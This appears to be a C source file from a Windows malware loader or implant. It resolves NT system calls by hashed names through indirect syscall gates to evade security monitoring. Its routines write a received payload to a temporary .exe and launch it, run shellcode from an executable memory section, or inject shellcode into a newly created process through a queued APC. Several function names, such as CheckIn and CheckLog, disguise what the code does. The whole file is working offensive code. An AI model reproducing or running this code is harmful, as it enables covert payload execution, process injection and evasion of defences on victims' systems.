#include "../include/Defines.h"


DWORD GetCall(DWORD crypted_hash, callDescriptor* pSyscall);

HANDLE hThread = NULL;
HANDLE hProc = NULL;



DWORD hashes[] = {
    0x916C6394, 
    0x625D5A2E,
    0x9523617C, 
    0x6D397E74, 
    0x154BFEAC, 
    0x97D165F6, 
    0xCACC5079, 
    0x54E7AF9F, 
    0x1ECC061D,
    0x15636D75  
};


callDescriptor GetByHash(DWORD hash) {
    callDescriptor getc = { 0 };
   
    DWORD status = GetCall(hash, &getc);

    return getc;
}

LPSTR RevString(const LPSTR data) {
    if (!data) return NULL;

    size_t len = strlen(data);
    LPSTR reversed = (LPSTR)malloc(len + 1);
    if (!reversed) return NULL;

    for (size_t i = 0; i < len; ++i) {
        reversed[i] = data[len - i - 1];
    }
    reversed[len] = '\0';

    return reversed;
}




wchar_t* ConvertToPath(const wchar_t* originalPath) {
    if (wcsncmp(originalPath, L"\\??\\", 4) == 0) {
        return _wcsdup(originalPath);
    }

    if (originalPath[1] == L':' && originalPath[2] == L'\\') {
        wchar_t* ntPath = (wchar_t*)malloc((wcslen(originalPath) + 5) * sizeof(wchar_t));
        if (ntPath == NULL) return NULL;

        swprintf(ntPath, wcslen(originalPath) + 5, L"\\??\\%s", originalPath);
        return ntPath;
    }

    return _wcsdup(originalPath);
}


wchar_t* CheckLog(const wchar_t* dllPath,PWSTR arguments) {
    UNICODE_STRING ntPath;
    PWSTR filePart = NULL;
    RTL_RELATIVE_NAME_U relativeName;



	ntPath.Buffer = ConvertToPath((wchar_t*)dllPath);
    if (arguments == NULL)
    {
        _with_params(ntPath.Buffer, NULL);
    }
    else
    {
        _with_params(ntPath.Buffer, arguments);
    }

    return _wcsdup(L"Started");
}



#define Attributes( p, n, a, r, s ) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);          \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
}

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif

#ifndef FILE_OVERWRITE_IF
#define FILE_OVERWRITE_IF 0x00000005
#endif

#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

#ifndef FILE_ATTRIBUTE_NORMAL
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#endif


typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


DWORD calcEnvSize(PWCHAR envStrings) {
    DWORD size = 0;
    while (1) {
        if (envStrings[size] == L'\0' && envStrings[size + 1] == L'\0') { 
            break;
        }
        size++;
    }
    return (size + 2) * sizeof(WCHAR);
}

wchar_t* convert_path(wchar_t* input_path) {
    if (input_path == NULL) {
        return NULL;
    }

    size_t length = wcslen(input_path);
    size_t new_length = length;
    for (size_t i = 0; i < length; i++) {
        if (input_path[i] == L'\\') {
            new_length++; 
        }
    }

    wchar_t* converted = (wchar_t*)malloc((new_length + 1) * sizeof(wchar_t));
    if (converted == NULL) {
        return NULL;
    }

   
    size_t pos = 0;
    for (size_t i = 0; i < length; i++) {
        if (input_path[i] == L'\\') {
            converted[pos++] = L'\\';
            converted[pos++] = L'\\';
        }
        else {
            converted[pos++] = input_path[i];
        }
    }
    converted[pos] = L'\0';

    return converted;
}

void InitUnicodeString(PUNICODE_STRING dst, PCWSTR src) {
    size_t len = wcslen(src) * sizeof(WCHAR);
    dst->Length = (USHORT)len;
    dst->MaximumLength = (USHORT)(len + sizeof(WCHAR));
    dst->Buffer = (PWSTR)src;
}


DWORD _with_params(PWSTR loc, PWSTR arguments) {



    callDescriptor syProc = GetByHash(hashes[8]);

    PS_CREATE_INFO procInfo = { 0 };
    PS_ATTRIBUTE_LIST attrList = { 0 };
    PROCESS_BASIC_INFORMATION procBasicInfo = { 0 };
    NTSTATUS status = 0;
    UNICODE_STRING imagePath, commandLine;
    WCHAR fullCmdLine[8192] = { 0 };


    InitUnicodeString(&imagePath, loc);
    if (arguments && *arguments) {
        swprintf(fullCmdLine, ARRAYSIZE(fullCmdLine), L"\"%s\" %s", loc, arguments);
    }
    else {
        swprintf(fullCmdLine, ARRAYSIZE(fullCmdLine), L"\"%s\"", loc);
    }

    InitUnicodeString(&commandLine, fullCmdLine);

    PRTL_USER_PROCESS_PARAMETERS userParams = (PRTL_USER_PROCESS_PARAMETERS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS) + 100);
    userParams->Length = sizeof(RTL_USER_PROCESS_PARAMETERS);
    userParams->MaximumLength = sizeof(RTL_USER_PROCESS_PARAMETERS);

    userParams->ImagePathName = imagePath;
    userParams->CommandLine = commandLine;


    PWCHAR envStrings = GetEnvironmentStringsW();

    DWORD envSize = calcEnvSize(envStrings);

    userParams->Environment = envStrings;
    userParams->EnvironmentSize = envSize;
    userParams->EnvironmentVersion = 0;
	userParams->ConsoleHandle = NULL;
    userParams->Flags = RTL_USER_PROCESS_PARAMETERS_NORMALIZED ;
    userParams->ShowWindowFlags = 0;


    procInfo.Size = sizeof(PS_CREATE_INFO);
    procInfo.State = PsCreateInitialState;
    
    attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    attrList.Attributes[0].Attribute = PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE);
    attrList.Attributes[0].Size = imagePath.Length;
    attrList.Attributes[0].Value = (ULONG_PTR)imagePath.Buffer;

    Preparecall(syProc.dwSyscallNr, syProc.pRecycledGate);
    status = Docall(&hProc, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, userParams, &procInfo, &attrList);

    return 0;
}

wchar_t* GetRandomTempFilePath()
{
    wchar_t tempPath[MAX_PATH];
    wchar_t filePath[MAX_PATH];

    DWORD len = GetTempPathW(MAX_PATH, tempPath);
    if (len == 0 || len > MAX_PATH) {
        return _wcsdup(L"");
    }

    UINT uRetVal = GetTempFileNameW(tempPath, L"tmp", 0, filePath);
    if (uRetVal == 0) {
        return _wcsdup(L"");
    }

    return _wcsdup(filePath); 
}


wchar_t* CheckIn(const BYTE* data, SIZE_T size , PWSTR arguments) {
    WCHAR tempPath[MAX_PATH] = { 0 };
    WCHAR filePath[MAX_PATH] = { 0 };
    NTSTATUS status;
    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING fileName;
    OBJECT_ATTRIBUTES objAttr;
    LARGE_INTEGER byteOffset;
    WCHAR nativeFilePath[MAX_PATH] = { 0 };

    callDescriptor FileGate = GetByHash(hashes[5]);
    callDescriptor CloseObject = GetByHash(hashes[6]);
    callDescriptor WriteToFile = GetByHash(hashes[7]);



    
    DWORD len = GetTempPathW(MAX_PATH, tempPath);
    if (len == 0 || len > MAX_PATH) {
   
        return _wcsdup(L"");
    }

    DWORD tick = GetTickCount();
    swprintf(filePath, MAX_PATH, L"%stmp%08X.exe", tempPath, tick);


    wcscpy_s(nativeFilePath, MAX_PATH, L"\\??\\");
    wcscat_s(nativeFilePath, MAX_PATH, filePath);

    InitUnicodeString(&fileName, nativeFilePath);
    Attributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);


    Preparecall(WriteToFile.dwSyscallNr, WriteToFile.pRecycledGate);
    status = Docall(&fileHandle, GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, NULL,
        FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {

        return _wcsdup(L"Failed ");
    }

    byteOffset.QuadPart = 0;

    Preparecall(FileGate.dwSyscallNr, FileGate.pRecycledGate);
    status = Docall(
        fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        (PVOID)data,
        (ULONG)size,
        &byteOffset,
        NULL
    );

    Preparecall(CloseObject.dwSyscallNr, CloseObject.pRecycledGate);
    Docall(fileHandle);



    return CheckLog(_wcsdup(nativeFilePath + 4),arguments);
}



void unescape_backslashes_inplace_w(wchar_t* s) {
    wchar_t* r = s;
    wchar_t* w = s; 
    while (*r) {
        if (r[0] == L'\\' && r[1] == L'\\') {
            *w++ = L'\\'; 
            r += 2;
        }
        else {
            *w++ = *r++;
        }
    }
    *w = L'\0';
}



void* mycpy(void* dest, const void* src, size_t n) {
    unsigned char* d = (unsigned char*)dest;
    const unsigned char* s = (const unsigned char*)src;

    while (n--) {
        *d++ = *s++;
    }

    return dest;
}

BOOL ProcesssData(const BYTE* data, SIZE_T size, Result_ pResult, PWSTR PathD) {

    if (!data || size == 0 || !pResult)
        return FALSE;

    ZeroMemory(pResult, sizeof(INJ_Resul));

    callDescriptor SectionHandle = GetByHash(hashes[0]);
    callDescriptor OfSection = GetByHash(hashes[1]);
    callDescriptor pcThreadRoutine = GetByHash(hashes[2]);
    callDescriptor ThreadDescriptor = GetByHash(hashes[3]);
    callDescriptor emoteProcess = GetByHash(hashes[4]);

    HANDLE hSection = NULL;
    PVOID pViewLocal = NULL, pViewRemote = NULL;

    if (wcslen(PathD) < 4)
    {
        Preparecall(SectionHandle.dwSyscallNr, SectionHandle.pRecycledGate);
        NTSTATUS status = Docall(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&size,
            PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        if (!NT_SUCCESS(status))
            goto fails;

        SIZE_T viewSize = size;

        Preparecall(OfSection.dwSyscallNr, OfSection.pRecycledGate);
        status = Docall(hSection, GetCurrentProcess(), &pViewLocal, 0, 0, NULL,
            &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status))
            goto fails;

        mycpy(pViewLocal, data, size);

        void (*pShellcodeFunc)() = (void (*)())pViewLocal;
        pShellcodeFunc();

        pResult->dwSuccess = SUCCESS;


        // Cleanup
        if (pViewLocal)
            UnmapViewOfFile(pViewLocal);
        if (hSection)
            CloseHandle(hSection);

        return TRUE;

    fails:
        if (pViewLocal)
            UnmapViewOfFile(pViewLocal);
        if (hSection)
            CloseHandle(hSection);
        return FALSE;
    }
    else
    {
		unescape_backslashes_inplace_w(PathD);
        CheckLog(PathD, NULL);


        Preparecall(emoteProcess.dwSyscallNr, emoteProcess.pRecycledGate);
        Docall(hProc);

        Preparecall(SectionHandle.dwSyscallNr, SectionHandle.pRecycledGate);
        NTSTATUS status = Docall(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&size,
            PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        if (!NT_SUCCESS(status))
            goto fail;

        SIZE_T viewSize = size;

        Preparecall(OfSection.dwSyscallNr, OfSection.pRecycledGate);
        status = Docall(hSection, GetCurrentProcess(), &pViewLocal, 0, 0, NULL,
            &viewSize, 2, 0, PAGE_READWRITE);
        if (!NT_SUCCESS(status))
            goto fail;


        Preparecall(OfSection.dwSyscallNr, OfSection.pRecycledGate);
        status = Docall(hSection, hProc, &pViewRemote, 0, 0, NULL,
            &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status))
            goto fail;


        mycpy(pViewLocal, data, size);


        Preparecall(pcThreadRoutine.dwSyscallNr, pcThreadRoutine.pRecycledGate);
        status = Docall(hThread, (PKNORMAL_ROUTINE)pViewRemote, pViewRemote, NULL, NULL);
        if (!NT_SUCCESS(status))
            goto fail;


        Preparecall(ThreadDescriptor.dwSyscallNr, ThreadDescriptor.pRecycledGate);
        status = Docall(hThread, NULL);
        if (!NT_SUCCESS(status))
            goto fail;


        pResult->dwSuccess = SUCCESS;

        return TRUE;

    fail:
        if (hThread) CloseHandle(hThread);
        if (hProc) CloseHandle(hProc);
        return FALSE;
    }

    
}

